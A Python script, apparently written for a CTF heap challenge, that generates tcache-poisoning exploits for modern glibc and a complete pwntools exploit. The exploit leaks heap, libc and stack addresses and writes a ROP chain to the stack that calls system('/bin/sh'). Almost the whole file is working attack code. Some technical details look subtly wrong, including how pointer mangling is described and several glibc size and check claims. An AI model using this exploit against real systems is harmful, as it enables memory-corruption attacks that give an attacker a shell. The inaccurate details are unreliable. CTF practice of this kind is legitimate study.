#!/usr/bin/env python3

"""
Advanced Tcache Exploitation Techniques
Based on JustCTF2025 Baby Heap challenge analysis
Includes modern glibc 2.39+ bypass techniques
"""

import struct
import os
import sys
from pathlib import Path

class AdvancedTcacheTechniques:
    """Advanced tcache exploitation techniques for modern glibc"""
    
    def __init__(self):
        self.tcache_techniques = {
            "tcache_poisoning_modern": self.modern_tcache_poisoning,
            "unsorted_bin_leak": self.unsorted_bin_libc_leak,
            "fake_chunk_creation": self.create_fake_chunk_unsorted,
            "stack_overwrite_tcache": self.tcache_to_stack_overwrite,
            "environ_leak_technique": self.environ_stack_leak
        }
        
        # Modern glibc constants
        self.TCACHE_MAX_BINS = 64
        self.TCACHE_FILL_COUNT = 7
        self.UNSORTED_BIN_MIN_SIZE = 0x410
        
        print("[+] Advanced Tcache Techniques initialized")
    
    def detect_tcache_challenge(self, binary_path):
        """Detect tcache-based heap challenges"""
        try:
            with open(binary_path, 'rb') as f:
                content = f.read()
            
            tcache_indicators = [
                b"tcache", b"malloc", b"free", b"heap",
                b"UAF", b"use-after-free", b"glibc",
                b"unsorted", b"main_arena", b"libc"
            ]
            
            detected_indicators = []
            for indicator in tcache_indicators:
                if indicator in content:
                    detected_indicators.append(indicator.decode('utf-8', errors='ignore'))
            
            if len(detected_indicators) >= 4:
                print(f"[+] Tcache challenge detected with indicators: {detected_indicators}")
                return True
            
            return False
            
        except Exception as e:
            print(f"[-] Error detecting tcache challenge: {e}")
            return False
    
    def modern_tcache_poisoning(self, target_addr, tcache_key=None):
        """
        Modern tcache poisoning with pointer mangling (glibc 2.32+)
        Handles tcache key-based protection
        """
        print(f"[+] Crafting modern tcache poisoning for target: 0x{target_addr:x}")
        
        def mangle_pointer(key, addr):
            """XOR-based pointer mangling for tcache protection"""
            return key ^ addr if key else addr
        
        tcache_poison_code = f"""
def modern_tcache_poisoning(io, heap_base, target_addr, tcache_key):
    '''
    Modern tcache poisoning with glibc 2.32+ protections
    '''
    print(f"[+] Performing tcache poisoning to {{target_addr:x}}")
    
    # Step 1: Create chunks and free them to populate tcache
    for i in range(2):
        malloc(i, p64(0x11) * 6)  # Create chunks
    
    for i in range(2):
        free(i)  # Free to tcache
    
    # Step 2: Leak tcache key and mangled pointer
    key = u64(read(0))  # First 8 bytes contain tcache key
    mangled = u64(read(1))  # Mangled next pointer
    
    # Unmangle to get actual heap address
    actual_heap_addr = mangled ^ key
    print(f"[+] Tcache key: {{key:x}}")
    print(f"[+] Heap leak: {{actual_heap_addr:x}}")
    
    # Step 3: Poison tcache freelist
    # Write mangled target address to tcache entry
    mangled_target = key ^ target_addr
    write(1, p64(mangled_target))
    
    # Step 4: Allocate from poisoned tcache
    malloc(2, b"dummy")  # This gets the original chunk
    malloc(3, b"controlled")  # This gets our target address
    
    print(f"[+] Successfully allocated at target address: {{target_addr:x}}")
    return True

# Usage example:
# modern_tcache_poisoning(io, heap_base, target_addr, tcache_key)
"""
        
        return tcache_poison_code
    
    def unsorted_bin_libc_leak(self, fake_chunk_size=0x421):
        """
        Create fake chunk and force it into unsorted bin for libc leak
        Exploits main_arena pointers in unsorted bin fd/bk
        """
        print(f"[+] Building unsorted bin libc leak technique")
        
        unsorted_leak_code = f"""
def unsorted_bin_libc_leak(io, heap_base, tcache_key):
    '''
    Force chunk into unsorted bin to leak libc via main_arena pointers
    '''
    print("[+] Setting up unsorted bin leak...")
    
    # Step 1: Create overlapping chunks via tcache poisoning
    # This allows us to corrupt chunk metadata
    
    # Create chunks for tcache poisoning
    for i in range(2):
        malloc(i, p64(0x11) * 6)
    for i in range(2):
        free(i)
    
    # Get tcache key and heap leak
    key = u64(read(0))
    mangled = u64(read(1))
    heap_leak = mangled ^ key
    
    # Poison tcache to get overlapping allocation
    overlap_target = heap_leak + 0x10  # Overlap with chunk 0
    write(1, p64(key ^ overlap_target))
    
    malloc(2, b"dummy")  # Consume original
    malloc(3, b"victim")  # Gets overlapping chunk
    
    # Step 2: Corrupt chunk size to make it large (>0x410 for unsorted bin)
    # Write fake chunk header with large size
    fake_size = {fake_chunk_size}  # Large enough for unsorted bin
    write(0, p64(0) + p64(fake_size))
    
    # Step 3: Fill tcache for this size to force unsorted bin usage
    # Create and free chunks to fill tcache (7 chunks max)
    for i in range(4, 11):  # Create 7 chunks
        malloc(i, b"filler")
    
    for i in range(4, 11):  # Free to fill tcache
        free(i)
    
    # Step 4: Create fake next chunk to pass glibc checks
    # Next chunk must have proper prev_inuse bit and size
    next_chunk_addr = heap_leak + fake_size
    fake_next_chunk = p64(0) + p64(0x21)  # Small chunk with prev_inuse=1
    
    # Write fake next chunk (need another tcache poison for this)
    malloc(11, b"setup")
    malloc(12, b"setup2")
    free(11)
    free(12)
    
    write(12, p64(key ^ next_chunk_addr))
    malloc(13, b"dummy")
    malloc(14, fake_next_chunk)
    
    # Step 5: Free the large fake chunk - goes to unsorted bin
    free(3)  # This should go to unsorted bin due to large size
    
    # Step 6: Read fd pointer to get main_arena leak
    libc_leak = u64(read(3))  # fd points into main_arena
    libc_base = libc_leak - 0x203b20  # Adjust offset for your libc version
    
    print(f"[+] Libc leak: {{libc_leak:x}}")
    print(f"[+] Libc base: {{libc_base:x}}")
    
    return libc_base

# Usage:
# libc_base = unsorted_bin_libc_leak(io, heap_base, tcache_key)
"""
        
        return unsorted_leak_code
    
    def create_fake_chunk_unsorted(self, chunk_size=0x421):
        """
        Create fake chunk that passes glibc 2.39+ checks for unsorted bin
        """
        print(f"[+] Creating fake chunk for unsorted bin (size: 0x{chunk_size:x})")
        
        fake_chunk_info = {
            "size_requirements": {
                "minimum": 0x410,  # Minimum for unsorted bin
                "alignment": 0x10,  # Must be 16-byte aligned
                "prev_inuse": True  # Previous chunk must be in use
            },
            "next_chunk_requirements": {
                "prev_size": chunk_size,  # Must match our chunk size
                "size_field": "valid",    # Must be valid size
                "prev_inuse": True        # Must have prev_inuse bit set
            },
            "glibc_checks": [
                "Size must be >= MIN_LARGE_SIZE (0x410)",
                "Size must be aligned to MALLOC_ALIGNMENT (0x10)",
                "Next chunk's prev_size must equal our size",
                "Next chunk must have prev_inuse bit set",
                "Must not have IS_MMAPPED bit set",
                "Must pass chunk_ok_for_memalign checks"
            ]
        }
        
        fake_chunk_template = f"""
def create_fake_chunk_for_unsorted(heap_addr, chunk_size=0x{chunk_size:x}):
    '''
    Create fake chunk that passes modern glibc checks
    '''
    fake_chunk = b""
    
    # Fake chunk header
    fake_chunk += p64(0)  # prev_size (not used since prev_inuse=1)
    fake_chunk += p64(chunk_size | 1)  # size with prev_inuse bit
    
    # Fake chunk data (will be overwritten with fd/bk by unsorted bin)
    fake_chunk += b"A" * (chunk_size - 0x10)
    
    # Create fake next chunk to pass consolidation checks
    next_chunk_addr = heap_addr + chunk_size
    fake_next_chunk = b""
    fake_next_chunk += p64(chunk_size)  # prev_size = our chunk size
    fake_next_chunk += p64(0x21)        # small size with prev_inuse=1
    fake_next_chunk += b"B" * 0x10      # dummy data
    
    return {{
        "fake_chunk": fake_chunk,
        "fake_next_chunk": fake_next_chunk,
        "next_chunk_addr": next_chunk_addr,
        "total_size": len(fake_chunk) + len(fake_next_chunk)
    }}

# Example usage:
# fake_data = create_fake_chunk_for_unsorted(heap_base + 0x100)
# write_to_heap(heap_base + 0x100, fake_data["fake_chunk"])
# write_to_heap(fake_data["next_chunk_addr"], fake_data["fake_next_chunk"])
"""
        
        return {
            "fake_chunk_info": fake_chunk_info,
            "fake_chunk_template": fake_chunk_template
        }
    
    def tcache_to_stack_overwrite(self, stack_addr, rop_chain):
        """
        Use tcache poisoning to overwrite stack with ROP chain
        """
        print(f"[+] Building tcache to stack overwrite technique")
        
        stack_overwrite_code = f"""
def tcache_to_stack_overwrite(io, libc_base, stack_addr, tcache_key):
    '''
    Use tcache poisoning to write ROP chain to stack
    '''
    print(f"[+] Targeting stack address: {{stack_addr:x}}")
    
    # Step 1: Setup tcache poisoning for stack write
    malloc(20, b"setup1")
    malloc(21, b"setup2")
    free(20)
    free(21)
    
    # Step 2: Poison tcache to point to stack
    target_stack = stack_addr - 0x8  # Adjust for chunk header
    mangled_stack = tcache_key ^ target_stack
    write(21, p64(mangled_stack))
    
    # Step 3: Allocate from poisoned tcache
    malloc(22, b"dummy")  # Gets original chunk
    
    # Step 4: Build ROP chain
    rop_chain = build_rop_chain(libc_base)
    
    # Step 5: Write ROP chain to stack
    malloc(23, rop_chain)  # This writes to stack!
    
    print("[+] ROP chain written to stack")
    return True

def build_rop_chain(libc_base):
    '''Build ROP chain for system("/bin/sh")'''
    # Calculate gadget addresses
    pop_rdi = libc_base + 0x2a3e5   # pop rdi; ret
    ret = libc_base + 0x29cd6       # ret (for alignment)
    system = libc_base + 0x50d70    # system
    binsh = libc_base + 0x1d8698    # "/bin/sh"
    
    # Build ROP chain
    rop = b""
    rop += p64(0)           # Overwrite saved rbp if needed
    rop += p64(pop_rdi)     # pop rdi; ret
    rop += p64(binsh)       # "/bin/sh"
    rop += p64(ret)         # ret (stack alignment)
    rop += p64(system)      # system("/bin/sh")
    
    return rop

# Usage:
# tcache_to_stack_overwrite(io, libc_base, stack_addr, tcache_key)
"""
        
        return stack_overwrite_code
    
    def environ_stack_leak(self, libc_base):
        """
        Use __environ to leak stack address
        """
        print("[+] Building __environ stack leak technique")
        
        environ_leak_code = f"""
def leak_stack_via_environ(io, libc_base, tcache_key):
    '''
    Use tcache poisoning to read from __environ and leak stack
    '''
    print("[+] Leaking stack address via __environ...")
    
    # Step 1: Setup tcache poisoning to read __environ
    malloc(30, b"env1")
    malloc(31, b"env2")
    free(30)
    free(31)
    
    # Step 2: Poison tcache to point to __environ - 0x18
    # We subtract 0x18 to account for chunk header and get proper alignment
    environ_addr = libc_base + 0x221200  # Adjust offset for your libc
    target_addr = environ_addr - 0x18
    mangled_environ = tcache_key ^ target_addr
    write(31, p64(mangled_environ))
    
    # Step 3: Allocate from poisoned tcache
    malloc(32, b"dummy")
    malloc(33, b"A" * 0x18)  # Fill padding
    
    # Step 4: Read stack address from __environ
    io.sendlineafter(b"> ", b'2')  # Read option
    io.sendlineafter(b"Index: ", b'33')
    io.recvuntil(b"A" * 0x18)
    stack_leak = u64(io.recv(6).ljust(8, b'\\x00'))
    
    print(f"[+] Stack leak: {{stack_leak:x}}")
    return stack_leak

# Usage:
# stack_addr = leak_stack_via_environ(io, libc_base, tcache_key)
"""
        
        return environ_leak_code
    
    def generate_complete_tcache_exploit(self, target_binary="./babyheap"):
        """Generate complete tcache exploitation script"""
        print("[+] Generating complete tcache exploitation script...")
        
        complete_exploit = f"""#!/usr/bin/env python3

'''
Advanced Tcache Exploitation Script
Based on JustCTF2025 Baby Heap challenge
Handles modern glibc 2.39+ protections and tcache poisoning
'''

from pwn import *

context.binary = exe = ELF('{target_binary}', checksec=False)
libc = exe.libc
context.log_level = "info"

# XOR-based pointer mangling for tcache protection
def mangle(key, addr):
    return key ^ addr

# Heap operations
def malloc(idx, data):
    io.sendlineafter(b"> ", b'1')
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Data: ", data)

def free(idx):
    io.sendlineafter(b"> ", b'4')
    io.sendlineafter(b"Index: ", str(idx).encode())

def read(idx):
    io.sendlineafter(b"> ", b'2')
    io.sendlineafter(b"Index: ", str(idx).encode())
    return io.recvline().strip().ljust(8, b"\\x00")

def write(idx, data):
    io.sendlineafter(b"> ", b'3')
    io.sendlineafter(b"Index: ", str(idx).encode())
    io.sendafter(b"Data: ", data)

def exploit():
    print("[+] Starting advanced tcache exploitation...")
    
    # Phase 1: Get heap leak and tcache key
    print("[+] Phase 1: Getting heap leak and tcache key...")
    
    for i in range(2):
        malloc(i, p64(0x11) * 6)
    for i in range(2):
        free(i)
    
    # Leak tcache key and mangled pointer
    key = u64(read(0))
    mangled = u64(read(1))
    heap_leak = mangled ^ key
    
    log.success(f"Tcache key: {{key:x}}")
    log.success(f"Heap leak: {{heap_leak:x}}")
    
    # Phase 2: Create fake chunk for unsorted bin leak
    print("[+] Phase 2: Creating fake chunk for libc leak...")
    
    # Tcache poisoning to get overlapping chunk
    write(1, p64(mangle(key, heap_leak + 0x10)))
    malloc(2, b"dummy")
    malloc(3, b"victim")
    
    # Corrupt chunk size to 0x421 (large enough for unsorted bin)
    write(0, p64(0) + p64(0x421))
    
    # Fill tcache for 0x420 size
    for i in range(4, 11):
        malloc(i, b"filler")
    for i in range(4, 11):
        free(i)
    
    # Create fake next chunk to pass glibc checks
    malloc(11, b"setup")
    malloc(12, b"setup2")
    free(11)
    free(12)
    
    next_chunk_addr = heap_leak + 0x420
    write(12, p64(mangle(key, next_chunk_addr)))
    malloc(13, b"dummy")
    malloc(14, p64(0x421) + p64(0x21))  # prev_size and size of next chunk
    
    # Phase 3: Trigger unsorted bin and leak libc
    print("[+] Phase 3: Triggering unsorted bin for libc leak...")
    
    free(3)  # Goes to unsorted bin due to large size
    libc_leak = u64(read(3))
    libc.address = libc_leak - 0x203b20  # Adjust for your libc version
    
    log.success(f"Libc base: {{libc.address:x}}")
    
    # Phase 4: Leak stack address via __environ
    print("[+] Phase 4: Leaking stack address via __environ...")
    
    malloc(15, b"env_setup")
    malloc(16, b"env_setup2")
    free(15)
    free(16)
    
    environ_target = libc.sym.environ - 0x18
    write(16, p64(mangle(key, environ_target)))
    malloc(17, b"dummy")
    malloc(18, b"A" * 0x18)
    
    # Read stack address
    io.sendlineafter(b"> ", b'2')
    io.sendlineafter(b"Index: ", b'18')
    io.recvuntil(b"A" * 0x18)
    stack_leak = u64(io.recv(6).ljust(8, b'\\x00'))
    
    log.success(f"Stack leak: {{stack_leak:x}}")
    
    # Phase 5: ROP chain to stack
    print("[+] Phase 5: Writing ROP chain to stack...")
    
    malloc(19, b"rop_setup")
    malloc(20, b"rop_setup2")
    free(19)
    free(20)
    
    # Target return address on stack (adjust offset as needed)
    stack_target = stack_leak - 0x158
    write(20, p64(mangle(key, stack_target)))
    malloc(21, b"dummy")
    
    # Build ROP chain
    rop = ROP(libc)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = pop_rdi + 1
    binsh = next(libc.search(b'/bin/sh\\0'))
    
    rop_chain = flat(
        0,                    # Overwrite saved rbp
        pop_rdi, binsh,       # pop rdi; "/bin/sh"
        ret,                  # ret (alignment)
        libc.sym.system       # system("/bin/sh")
    )
    
    malloc(22, rop_chain)
    
    print("[+] ROP chain written to stack, triggering...")
    
    # Trigger ROP chain execution (return from current function)
    io.interactive()

def main():
    global io
    io = process(exe.path)
    # input(f"[+] PID: {{io.pid}}")  # Uncomment for GDB debugging
    exploit()

if __name__ == "__main__":
    main()
"""
        
        return complete_exploit
    
    def analyze_tcache_protections(self, glibc_version="2.39"):
        """Analyze tcache protections in different glibc versions"""
        print(f"[+] Analyzing tcache protections for glibc {glibc_version}...")
        
        protections = {
            "2.27": {
                "tcache_key": False,
                "double_free_check": False,
                "count_check": True,
                "size_check": True
            },
            "2.32": {
                "tcache_key": True,
                "double_free_check": True,
                "count_check": True,
                "size_check": True
            },
            "2.39": {
                "tcache_key": True,
                "double_free_check": True,
                "count_check": True,
                "size_check": True,
                "enhanced_checks": True
            }
        }
        
        current_protections = protections.get(glibc_version, protections["2.39"])
        
        bypass_techniques = {
            "tcache_key": "Leak key from freed chunk, use XOR mangling",
            "double_free_check": "Use different chunks or corrupt tcache structure",
            "count_check": "Ensure count doesn't exceed TCACHE_FILL_COUNT",
            "size_check": "Use valid chunk sizes within tcache range",
            "enhanced_checks": "Create proper fake chunks with valid metadata"
        }
        
        return {
            "protections": current_protections,
            "bypass_techniques": bypass_techniques
        }

def main():
    """Test advanced tcache techniques"""
    print("Advanced Tcache Exploitation Techniques Test")
    print("=" * 60)
    
    tcache_exploiter = AdvancedTcacheTechniques()
    
    # Test detection
    test_binary = "test_tcache_challenge"
    if tcache_exploiter.detect_tcache_challenge(test_binary):
        print("[+] Tcache challenge detected")
        
        # Test modern tcache poisoning
        print("\n[+] Testing modern tcache poisoning...")
        poison_code = tcache_exploiter.modern_tcache_poisoning(0x7fffffffe000)
        print("[+] Modern tcache poisoning technique generated")
        
        # Test unsorted bin leak
        print("\n[+] Testing unsorted bin libc leak...")
        unsorted_code = tcache_exploiter.unsorted_bin_libc_leak()
        print("[+] Unsorted bin leak technique generated")
        
        # Test fake chunk creation
        print("\n[+] Testing fake chunk creation...")
        fake_chunk = tcache_exploiter.create_fake_chunk_unsorted()
        print(f"[+] Fake chunk requirements: {len(fake_chunk['fake_chunk_info']['glibc_checks'])} checks")
        
        # Generate complete exploit
        print("\n[+] Generating complete tcache exploit...")
        complete_exploit = tcache_exploiter.generate_complete_tcache_exploit()
        print("[+] Complete tcache exploit generated")
        
        # Analyze protections
        print("\n[+] Analyzing tcache protections...")
        protections = tcache_exploiter.analyze_tcache_protections()
        active_protections = sum(protections["protections"].values())
        print(f"[+] Active protections: {active_protections}")
    
    else:
        print("[-] No tcache challenge detected")
    
    print("\n[+] Advanced tcache techniques test completed!")

if __name__ == "__main__":
    main()